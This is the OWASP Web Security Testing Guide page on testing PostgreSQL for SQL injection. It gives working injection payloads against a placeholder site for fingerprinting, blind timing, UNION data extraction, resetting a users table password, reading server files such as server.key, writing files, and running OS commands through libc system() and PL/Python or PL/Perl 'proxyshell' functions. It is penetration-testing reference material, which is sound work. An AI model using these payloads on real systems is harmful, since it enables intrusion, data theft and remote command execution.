# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
# Testing PostgreSQL
## Summary
In this section, some SQL Injection techniques for PostgreSQL will be discussed. These techniques have the following characteristics:
  * PHP Connector allows multiple statements to be executed by using `;` as a statement separator
  * SQL Statements can be truncated by appending the comment char: `--`.
  * `LIMIT` and `OFFSET` can be used in a `SELECT` statement to retrieve a portion of the result set generated by the `query`


From now on it is assumed that `https://www.example.com/news.php?id=1` is vulnerable to SQL Injection attacks.
## How to Test
### Identifying PostgreSQL
When a SQL Injection has been found, you need to carefully fingerprint the backend database engine. You can determine that the backend database engine is PostgreSQL by using the _::_ cast operator.
#### Examples
`https://www.example.com/store.php?id=1 AND 1::int=1`
In addition, the function _version()_ can be used to grab the PostgreSQL banner. This will also show the underlying operating system type and version.
##### Example
`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`
An example of a banner string that could be returned is:
`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`
### Blind Injection
For blind SQL injection attacks, you should take into consideration the following built-in functions:
  * String Length `LENGTH(str)`
  * Extract a substring from a given string `SUBSTR(str,index,offset)`
  * String representation with no single quotes `CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`


Starting at version 8.2, PostgreSQL introduced a built-in function, `pg_sleep(n)`, to make the current session process sleep for `n` seconds. This function can be leveraged to execute timing attacks (discussed in detail at [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).
In addition, you can easily create a custom `pg_sleep(n)` in previous versions by using libc:
  * `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`


### Single Quote Unescape
Strings can be encoded, to prevent single quotes escaping, by using `chr()` function.
  * `chr(n)`: Returns the character whose ASCII value corresponds to the number `n`
  * `ascii(n)`: Returns the ASCII value which corresponds to the character `n`


Let’s say you want to encode the string ‘root’:
```
selectascii('r')
114
selectascii('o')
111
selectascii('t')
116

```

We can encode ‘root’ as:
`chr(114)||chr(111)||chr(111)||chr(116)`
#### Example
`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`
### Attack Vectors
#### Current User
The identity of the current user can be retrieved with the following SQL SELECT statements:
```
SELECTuser
SELECTcurrent_user
SELECTsession_user
SELECTusenameFROMpg_user
SELECTgetpgusername()

```

##### Example
```
https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--

```

#### Current Database
The built-in function current_database() returns the current database name.
##### Example
`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`
#### Reading from a File
PostgreSQL provides two ways to access a local file:
  * `COPY` statement
  * `pg_read_file()` internal function (starting from PostgreSQL 8.1)


##### COPY
This operator copies data between a file and a table. The PostgreSQL engine accesses the local file system as the `postgres` user.
###### Example
```
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--

```

Data should be retrieved by performing a `UNION Query SQL Injection`:
  * retrieves the number of rows previously added in `file_store` with `COPY` statement
  * retrieves a row at a time with UNION SQL Injection


```
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--

```

##### pg_read_file()
This function was introduced in `PostgreSQL 8.1` and allows one to read arbitrary files located inside DBMS data directory.
###### Example
`SELECT pg_read_file('server.key',0,1000);`
#### Writing to a File
By reverting the COPY statement, we can write to the local file system with the `postgres` user rights
`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`
#### Shell Injection
PostgreSQL provides a mechanism to add custom functions by using both Dynamic Library and scripting languages such as python, perl, and tcl.
##### Dynamic Library
Until PostgreSQL 8.1, it was possible to add a custom function linked with `libc`:
`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`
Since `system` returns an `int` how we can fetch results from `system` stdout?
Here’s a little trick:
  * create a `stdout` table: `CREATE TABLE stdout(id serial, system_out text)`
  * executing a shell command redirecting its `stdout`: `SELECT system('uname -a > /tmp/test')`
  * use a `COPY` statements to push output of previous command in `stdout` table: `COPY stdout(system_out) FROM '/tmp/test*'`
  * retrieve output from `stdout`: `SELECT system_out FROM stdout`


###### Example
```
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--

```

##### Plpython
PL/Python allows users to code PostgreSQL functions in python. It’s untrusted so there is no way to restrict what user can do. It’s not installed by default and can be enabled on a given database by `CREATELANG`
  * Check if PL/Python has been enabled on a database: `SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
  * If not, try to enable: `CREATE LANGUAGE plpythonu`
  * If either of the above succeeded, create a proxy shell function: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`
  * Have fun with: `SELECT proxyshell(os command);`


###### Example
  * Create a proxy shell function: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args[0]).read()’ LANGUAGE plpythonu;--`
  * Run an OS Command: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`


##### Plperl
Plperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as `open`. By doing so, it’s impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the `postgres` user, to avoid the so-called application mask filtering of trusted/untrusted operations.
  * Check if PL/perl-untrusted has been enabled: `SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
  * If not, assuming that sysadm has already installed the plperl package, try: `CREATE LANGUAGE plperlu`
  * If either of the above succeeded, create a proxy shell function: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu`
  * Have fun with: `SELECT proxyshell(os command);`


###### Example
  * Create a proxy shell function: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;`
  * Run an OS Command: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`


## Spotlight: Salesforce
[![image](https://owasp.org/assets/images/corp-member-logo/salesforce.png)](https://www.salesforce.com/)
Salesforce is the world’s (#)1 customer relationship management (CRM) platform. Our cloud-based applications for sales, service, marketing, and more don’t require IT experts to set up or manage — simply log in and start connecting to customers in a whole new way.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/Heeler.jpg)](https://heeler.com)[![image](https://owasp.org/assets/images/corp-member-logo/SecureCodeWarrior.png)](https://www.securecodewarrior.com/)[![image](https://owasp.org/assets/images/corp-member-logo/bionic_logo_1.png)](https://www.bionic.ai/)[![image](https://owasp.org/assets/images/corp-member-logo/Pynt.png)](https://www.pynt.io/)[![image](https://owasp.org/assets/images/corp-member-logo/Checkmarxn-NewLogo2024.jpg)](http://checkmarx.com)[![image](https://owasp.org/assets/images/corp-member-logo/SecureFlag.png)](https://www.secureflag.com/)[![image](https://owasp.org/assets/images/corp-member-logo/GuardSquare.png)](https://www.guardsquare.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Equixly.png)](https://equixly.com)[![image](https://owasp.org/assets/images/corp-member-logo/IriusRisk.png)](https://www.iriusrisk.com/)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
